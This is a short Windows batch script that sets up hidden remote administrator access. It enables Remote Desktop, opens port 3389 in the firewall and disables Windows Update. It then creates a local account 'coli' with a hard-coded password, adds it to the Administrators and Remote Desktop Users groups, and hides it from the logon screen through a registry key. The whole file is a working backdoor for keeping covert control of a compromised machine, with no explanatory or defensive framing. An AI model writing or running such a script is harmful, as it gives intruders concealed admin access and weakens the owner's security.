@echo off


reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
sc config wuauserv start= disabled
net stop wuauserv
sc config TermService start= auto
net start Termservice
netsh.exe firewall add portopening TCP 3389 "Remote Desktop"

net user coli f@acxN@s /add
NET LOCALGROUP "Remote Desktop Users" coli /ADD
net localgroup "Administrators" coli /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v coli /t REG_DWORD /d 0 /f
